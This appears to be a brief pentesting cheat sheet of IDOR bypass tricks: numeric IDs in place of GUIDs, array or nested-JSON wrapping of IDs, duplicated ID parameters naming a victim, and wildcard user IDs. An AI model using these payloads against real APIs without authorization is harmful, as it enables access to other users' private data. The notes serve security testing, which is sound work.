
## IDOR
```
Even if ID is a GUID or random, send numeric: /?user_id=111

```


## IDOR in API with 401/403 errors
```
Wrap ID with an array {“id”:111} --> {“id”:[111]}
JSON wrap {“id”:111} --> {“id”:{“id”:111}}
Send ID twice URL?id=<LEGIT>&id=<VICTIM>
Send wildcard {"user_id":"*"}
```



